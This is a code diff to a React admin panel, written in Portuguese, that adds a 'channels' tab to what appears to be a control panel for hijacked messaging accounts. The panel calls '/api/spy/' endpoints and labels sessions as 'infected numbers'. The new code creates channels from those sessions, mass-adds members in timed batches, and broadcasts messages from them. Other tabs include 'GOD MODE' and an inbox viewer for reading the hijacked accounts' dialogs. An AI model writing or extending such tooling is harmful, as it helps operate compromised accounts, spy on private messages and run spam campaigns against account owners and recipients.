@@ -59,8 +59,202 @@ export default function AdminPanel() {
   const [storyUrl, setStoryUrl] = useState('');
   const [storyCaption, setStoryCaption] = useState('');
 
+  // --- ESTADOS DO GERENCIADOR DE CANAIS ---
+  const [channels, setChannels] = useState([]);
+  const [selectedChannel, setSelectedChannel] = useState(null);
+  const [creatingChannel, setCreatingChannel] = useState(false);
+  const [addingMembers, setAddingMembers] = useState(false);
+  const [broadcastingChannel, setBroadcastingChannel] = useState(false);
+  const [channelName, setChannelName] = useState('');
+  const [channelDescription, setChannelDescription] = useState('');
+  const [channelMessage, setChannelMessage] = useState('');
+  const [channelMediaUrl, setChannelMediaUrl] = useState('');
+  const [selectedChannelPhones, setSelectedChannelPhones] = useState(new Set());
+  // --- FUNÇÕES DO GERENCIADOR DE CANAIS ---
+  const loadChannels = async () => {
+    try {
+      const res = await authenticatedFetch('/api/spy/list-channels', { method: 'GET' });
+      const data = await res.json();
+      if (data.success) {
+        setChannels(data.channels);
+      }
+    } catch (e) {
+      console.error('Erro loadChannels:', e);
+    }
+  };
+
+  const createChannel = async () => {
+    if (!channelName.trim()) {
+      addLog('❌ Nome do canal é obrigatório');
+      return;
+    }
+    
+    const selectedPhones = Array.from(selectedChannelPhones);
+    if (selectedPhones.length === 0) {
+      addLog('❌ Selecione pelo menos um número infectado');
+      return;
+    }
+    
+    setCreatingChannel(true);
+    addLog(`📺 Criando canal "${channelName}"...`);
+    
+    try {
+      const res = await authenticatedFetch('/api/spy/create-channel', {
+        method: 'POST',
+        body: JSON.stringify({
+          phone: selectedPhones[0], // Usa o primeiro como criador
+          channelName: channelName.trim(),
+          channelDescription: channelDescription.trim(),
+          selectedPhones: selectedPhones
+        })
+      });
+      
+      const data = await res.json();
+      
+      if (data.success) {
+        addLog(`✅ Canal "${data.channelName}" criado com sucesso!`);
+        addLog(`🆔 ID: ${data.channelInfo.id}`);
+        addLog(`📱 Números selecionados: ${selectedPhones.length}`);
+        
+        setChannelName('');
+        setChannelDescription('');
+        setSelectedChannelPhones(new Set());
+        loadChannels();
+        setSelectedChannel(data.channel);
+        
+      } else {
+        addLog(`❌ Erro ao criar canal: ${data.error}`);
+      }
+    } catch (e) {
+      console.error('Erro createChannel:', e);
+      addLog(`⛔ Erro ao criar canal: ${e.message}`);
+    } finally {
+      setCreatingChannel(false);
+    }
+  };
+
+  const addMembersToChannel = async () => {
+    if (!selectedChannel) {
+      addLog('❌ Selecione um canal');
+      return;
+    }
+    
+    const phonesToAdd = Array.from(selectedChannelPhones);
+    if (phonesToAdd.length === 0) {
+      addLog('❌ Selecione pelo menos um número para adicionar membros');
+      return;
+    }
+    
+    setAddingMembers(true);
+    addLog(`👥 Adicionando membros ao canal "${selectedChannel.channel_name}"...`);
+    
+    try {
+      const res = await authenticatedFetch('/api/spy/add-members-batch', {
+        method: 'POST',
+        body: JSON.stringify({
+          channelId: selectedChannel.channel_id,
+          phonesToAdd: phonesToAdd,
+          batchSize: 50,
+          delayBetweenBatches: 5000
+        })
+      });
+      
+      const data = await res.json();
+      
+      if (data.success) {
+        addLog(`✅ Membros adicionados com sucesso!`);
+        addLog(`📊 Resumo:`);
+        addLog(`   • Total processado: ${data.summary.totalProcessed}`);
+        addLog(`   • Telefones bem-sucedidos: ${data.summary.successfulPhones}`);
+        addLog(`   • Total membros adicionados: ${data.summary.totalMembersAdded}`);
+        addLog(`   • Total membros no canal: ${data.summary.totalChannelMembers}`);
+        
+        data.results.forEach(result => {
+          if (result.success) {
+            addLog(`   📱 ${result.phone}: ${result.message}`);
+          } else {
+            addLog(`   ❌ ${result.phone}: ${result.error}`);
+          }
+        });
+        
+        loadChannels();
+        
+      } else {
+        addLog(`❌ Erro ao adicionar membros: ${data.error}`);
+      }
+    } catch (e) {
+      console.error('Erro addMembersToChannel:', e);
+      addLog(`⛔ Erro ao adicionar membros: ${e.message}`);
+    } finally {
+      setAddingMembers(false);
+    }
+  };
+
+  const broadcastToChannel = async () => {
+    if (!selectedChannel) {
+      addLog('❌ Selecione um canal');
+      return;
+    }
+    
+    if (!channelMessage.trim()) {
+      addLog('❌ Mensagem é obrigatória');
+      return;
+    }
+    
+    const senderPhones = Array.from(selectedChannelPhones);
+    if (senderPhones.length === 0) {
+      addLog('❌ Selecione pelo menos um número para enviar');
+      return;
+    }
+    
+    setBroadcastingChannel(true);
+    addLog(`📺 Enviando mensagem para canal "${selectedChannel.channel_name}"...`);
+    
+    try {
+      const res = await authenticatedFetch('/api/spy/broadcast-channel', {
+        method: 'POST',
+        body: JSON.stringify({
+          channelId: selectedChannel.channel_id,
+          message: channelMessage.trim(),
+          mediaUrl: channelMediaUrl.trim(),
+          senderPhones: senderPhones,
+          delayBetweenMessages: 3000
+        })
+      });
+      
+      const data = await res.json();
+      
+      if (data.success) {
+        addLog(`✅ Mensagem enviada com sucesso!`);
+        addLog(`📊 Resumo:`);
+        addLog(`   • Total processado: ${data.summary.totalProcessed}`);
+        addLog(`   • Enviados com sucesso: ${data.summary.successfulSends}`);
+        addLog(`   • Falhas: ${data.summary.failedSends}`);
+        addLog(`   • Membros no canal: ${data.summary.channelMembers}`);
+        
+        data.results.forEach(result => {
+          if (result.success) {
+            addLog(`   ✅ ${result.phone}: ${result.message}`);
+          } else {
+            addLog(`   ❌ ${result.phone}: ${result.error}`);
+          }
+        });
+        
+        setChannelMessage('');
+        setChannelMediaUrl('');
+        
+      } else {
+        addLog(`❌ Erro ao enviar mensagem: ${data.error}`);
+      }
+    } catch (e) {
+      console.error('Erro broadcastToChannel:', e);
+      addLog(`⛔ Erro ao enviar mensagem: ${e.message}`);
+    } finally {
+      setBroadcastingChannel(false);
+    }
+  };
+
   // --- ESTADOS DO INBOX VIEWER ---
-  const [inboxDialogs, setInboxDialogs] = useState([]);
   const [selectedInboxPhone, setSelectedInboxPhone] = useState('');
   const [selectedDialog, setSelectedDialog] = useState(null);
   const [inboxHistory, setInboxHistory] = useState([]);
@@ -150,6 +344,13 @@ export default function AdminPanel() {
 
     run();
   }, [isAuthenticated, authToken, isAdmin]);
+
+  // Carrega canais quando autenticado
+  useEffect(() => {
+    if (isAuthenticated) {
+      loadChannels();
+    }
+  }, [isAuthenticated]);
 
   // Função helper para fazer requisições autenticadas
   const authenticatedFetch = async (url, options = {}) => {
@@ -1325,6 +1526,7 @@ export default function AdminPanel() {
             <button onClick={()=>setTab('groups')} style={{padding:'10px 20px', background: tab==='groups'?'#d29922':'transparent', color:'white', border:'1px solid #d29922', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>👥 GRUPOS</button>
             <button onClick={()=>setTab('spy')} style={{padding:'10px 20px', background: tab==='spy'?'#8957e5':'transparent', color:'white', border:'1px solid #8957e5', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>👁️ GOD MODE</button>
             <button onClick={()=>setTab('inbox')} style={{padding:'10px 20px', background: tab==='inbox'?'#e34234':'transparent', color:'white', border:'1px solid #e34234', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>📬 INBOX</button>
+            <button onClick={() => setTab('channels')} style={{padding:'10px 20px', background: tab==='channels'?'#1f6feb':'transparent', color:'white', border:'1px solid #1f6feb', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>📺 CANAIS</button>
             <button onClick={()=>setTab('tools')} style={{padding:'10px 20px', background: tab==='tools'?'#1f6feb':'transparent', color:'white', border:'1px solid #1f6feb', borderRadius:'6px', cursor:'pointer', fontWeight:'bold'}}>🛠️ TOOLS</button>
             <div style={{marginLeft:'auto', fontSize:'12px', color:'#8b949e', display:'flex', alignItems:'center', gap:'15px'}}>
                 {isAdmin && <span style={{color:'#8957e5', fontWeight:'bold'}}>🔑 ADMIN</span>}
@@ -2696,6 +2898,215 @@ export default function AdminPanel() {
                                 <div style={{fontSize:'18px', marginBottom:'10px', fontWeight:'bold'}}>Nenhum diálogo selecionado</div>
                                 <div style={{fontSize:'14px', opacity:0.7, maxWidth:'300px', margin:'0 auto'}}>
                                     Selecione um número infectado e depois um diálogo para visualizar as mensagens completas
+                                </div>
+                            </div>
+                        </div>
+                    )}
+                </div>
+            </div>
+        )}
+
+        {/* --- ABA CANAIS --- */}
+        {tab === 'channels' && (
+            <div style={{display:'flex', gap:'20px', height:'100%'}}>
+                {/* PAINEL ESQUERDO - CONTROLES */}
+                <div style={{flex:'0 0 400px', background:'#161b22', borderRadius:'12px', padding:'20px', border:'1px solid #30363d', display:'flex', flexDirection:'column', gap:'20px'}}>
+                    <div>
+                        <h3 style={{color:'white', margin:'0 0 15px 0', fontSize:'16px'}}>📺 Gerenciador de Canais</h3>
+                        
+                        {/* Seleção de Canais */}
+                        <div style={{marginBottom:'20px'}}>
+                            <label style={{color:'#8b949e', fontSize:'12px', display:'block', marginBottom:'8px'}}>Canais Criados</label>
+                            <select 
+                                value={selectedChannel?.channel_id || ''} 
+                                onChange={(e) => {
+                                    const channel = channels.find(c => c.channel_id === e.target.value);
+                                    setSelectedChannel(channel || null);
+                                }}
+                                style={{width:'100%', padding:'10px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'6px', fontSize:'14px'}}
+                            >
+                                <option value="">Selecione um canal...</option>
+                                {channels.map(channel => (
+                                    <option key={channel.channel_id} value={channel.channel_id}>
+                                        {channel.channel_name} ({channel.total_members} membros)
+                                    </option>
+                                ))}
+                            </select>
+                        </div>
+
+                        {/* Criação de Canal */}
+                        <div style={{marginBottom:'20px'}}>
+                            <label style={{color:'#8b949e', fontSize:'12px', display:'block', marginBottom:'8px'}}>Criar Novo Canal</label>
+                            <input 
+                                type="text" 
+                                value={channelName}
+                                onChange={(e) => setChannelName(e.target.value)}
+                                placeholder="Nome do canal"
+                                style={{width:'100%', padding:'10px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'6px', fontSize:'14px', marginBottom:'10px'}}
+                            />
+                            <textarea 
+                                value={channelDescription}
+                                onChange={(e) => setChannelDescription(e.target.value)}
+                                placeholder="Descrição do canal (opcional)"
+                                style={{width:'100%', padding:'10px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'6px', fontSize:'14px', minHeight:'60px', resize:'vertical', marginBottom:'10px'}}
+                            />
+                            <button 
+                                onClick={createChannel}
+                                disabled={creatingChannel || !channelName.trim()}
+                                style={{
+                                    width:'100%',
+                                    padding:'12px',
+                                    background:'linear-gradient(135deg, #1f6feb 0%, #1a5fb4 100%)',
+                                    color:'white',
+                                    border:'none',
+                                    borderRadius:'6px',
+                                    cursor:creatingChannel || !channelName.trim() ? 'not-allowed' : 'pointer',
+                                    fontSize:'14px',
+                                    fontWeight:'bold'
+                                }}
+                            >
+                                {creatingChannel ? '⏳ Criando...' : '📺 Criar Canal'}
+                            </button>
+                        </div>
+
+                        {/* Adicionar Membros */}
+                        <div style={{marginBottom:'20px'}}>
+                            <button 
+                                onClick={addMembersToChannel}
+                                disabled={addingMembers || !selectedChannel}
+                                style={{
+                                    width:'100%',
+                                    padding:'12px',
+                                    background:'linear-gradient(135deg, #238636 0%, #1a7e37 100%)',
+                                    color:'white',
+                                    border:'none',
+                                    borderRadius:'6px',
+                                    cursor:addingMembers || !selectedChannel ? 'not-allowed' : 'pointer',
+                                    fontSize:'14px',
+                                    fontWeight:'bold'
+                                }}
+                            >
+                                {addingMembers ? '⏳ Adicionando...' : '👥 Adicionar Membros'}
+                            </button>
+                        </div>
+
+                        {/* Disparo para Canal */}
+                        <div style={{marginBottom:'20px'}}>
+                            <label style={{color:'#8b949e', fontSize:'12px', display:'block', marginBottom:'8px'}}>Mensagem para Canal</label>
+                            <textarea 
+                                value={channelMessage}
+                                onChange={(e) => setChannelMessage(e.target.value)}
+                                placeholder="Digite a mensagem para enviar ao canal..."
+                                style={{width:'100%', padding:'10px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'6px', fontSize:'14px', minHeight:'80px', resize:'vertical', marginBottom:'10px'}}
+                            />
+                            <input 
+                                type="url" 
+                                value={channelMediaUrl}
+                                onChange={(e) => setChannelMediaUrl(e.target.value)}
+                                placeholder="URL da mídia (opcional)"
+                                style={{width:'100%', padding:'10px', background:'#0d1117', color:'white', border:'1px solid #30363d', borderRadius:'6px', fontSize:'14px', marginBottom:'10px'}}
+                            />
+                            <button 
+                                onClick={broadcastToChannel}
+                                disabled={broadcastingChannel || !selectedChannel || !channelMessage.trim()}
+                                style={{
+                                    width:'100%',
+                                    padding:'12px',
+                                    background:'linear-gradient(135deg, #f59e0b 0%, #d97706 100%)',
+                                    color:'white',
+                                    border:'none',
+                                    borderRadius:'6px',
+                                    cursor:broadcastingChannel || !selectedChannel || !channelMessage.trim() ? 'not-allowed' : 'pointer',
+                                    fontSize:'14px',
+                                    fontWeight:'bold'
+                                }}
+                            >
+                                {broadcastingChannel ? '⏳ Enviando...' : '📺 Enviar Mensagem'}
+                            </button>
+                        </div>
+                    </div>
+
+                    {/* Seleção de Telefones */}
+                    <div style={{flex:1, overflowY:'auto'}}>
+                        <label style={{color:'#8b949e', fontSize:'12px', display:'block', marginBottom:'8px'}}>
+                            Telefones Selecionados ({selectedChannelPhones.size})
+                        </label>
+                        <div style={{display:'flex', flexDirection:'column', gap:'8px'}}>
+                            {sessions.map(session => (
+                                <label key={session.phone_number} style={{display:'flex', alignItems:'center', gap:'8px', color:'white', cursor:'pointer', fontSize:'13px'}}>
+                                    <input 
+                                        type="checkbox" 
+                                        checked={selectedChannelPhones.has(session.phone_number)}
+                                        onChange={(e) => {
+                                            const newSet = new Set(selectedChannelPhones);
+                                            if (e.target.checked) {
+                                                newSet.add(session.phone_number);
+                                            } else {
+                                                newSet.delete(session.phone_number);
+                                            }
+                                            setSelectedChannelPhones(newSet);
+                                        }}
+                                        style={{margin:0}}
+                                    />
+                                    <span>{session.phone_number}</span>
+                                </label>
+                            ))}
+                        </div>
+                    </div>
+                </div>
+
+                {/* PAINEL DIREITO - INFORMAÇÕES */}
+                <div style={{flex:1, background:'#161b22', borderRadius:'12px', padding:'20px', border:'1px solid #30363d'}}>
+                    <h3 style={{color:'white', margin:'0 0 20px 0', fontSize:'16px'}}>📊 Informações do Canal</h3>
+                    
+                    {selectedChannel ? (
+                        <div style={{display:'flex', flexDirection:'column', gap:'15px'}}>
+                            <div style={{padding:'15px', background:'#0d1117', borderRadius:'8px', border:'1px solid #30363d'}}>
+                                <div style={{color:'#8b949e', fontSize:'12px', marginBottom:'5px'}}>Nome</div>
+                                <div style={{color:'white', fontSize:'16px', fontWeight:'bold'}}>{selectedChannel.channel_name}</div>
+                            </div>
+                            
+                            <div style={{padding:'15px', background:'#0d1117', borderRadius:'8px', border:'1px solid #30363d'}}>
+                                <div style={{color:'#8b949e', fontSize:'12px', marginBottom:'5px'}}>ID</div>
+                                <div style={{color:'white', fontSize:'14px', fontFamily:'monospace'}}>{selectedChannel.channel_id}</div>
+                            </div>
+                            
+                            <div style={{padding:'15px', background:'#0d1117', borderRadius:'8px', border:'1px solid #30363d'}}>
+                                <div style={{color:'#8b949e', fontSize:'12px', marginBottom:'5px'}}>Membros</div>
+                                <div style={{color:'white', fontSize:'16px', fontWeight:'bold'}}>{selectedChannel.total_members || 0}</div>
+                            </div>
+                            
+                            <div style={{padding:'15px', background:'#0d1117', borderRadius:'8px', border:'1px solid #30363d'}}>
+                                <div style={{color:'#8b949e', fontSize:'12px', marginBottom:'5px'}}>Status</div>
+                                <div style={{color:'white', fontSize:'14px'}}>
+                                    <span style={{
+                                        padding:'4px 8px',
+                                        background:selectedChannel.status === 'broadcast_sent' ? '#238636' : 
+                                                  selectedChannel.status === 'members_added' ? '#f59e0b' : '#1f6feb',
+                                        borderRadius:'4px',
+                                        fontSize:'12px',
+                                        fontWeight:'bold'
+                                    }}>
+                                        {selectedChannel.status === 'broadcast_sent' ? '✅ Mensagem Enviada' : 
+                                         selectedChannel.status === 'members_added' ? '👥 Membros Adicionados' : '📺 Criado'}
+                                    </span>
+                                </div>
+                            </div>
+                            
+                            <div style={{padding:'15px', background:'#0d1117', borderRadius:'8px', border:'1px solid #30363d'}}>
+                                <div style={{color:'#8b949e', fontSize:'12px', marginBottom:'5px'}}>Criado em</div>
+                                <div style={{color:'white', fontSize:'14px'}}>
+                                    {new Date(selectedChannel.created_at).toLocaleString('pt-BR')}
+                                </div>
+                            </div>
+                        </div>
+                    ) : (
+                        <div style={{display:'flex', alignItems:'center', justifyContent:'center', height:'200px', color:'#8b949e', textAlign:'center'}}>
+                            <div>
+                                <div style={{fontSize:'48px', marginBottom:'15px'}}>📺</div>
+                                <div style={{fontSize:'16px', marginBottom:'8px'}}>Nenhum canal selecionado</div>
+                                <div style={{fontSize:'14px', opacity:0.7}}>
+                                    Selecione um canal existente ou crie um novo
                                 </div>
                             </div>
                         </div>
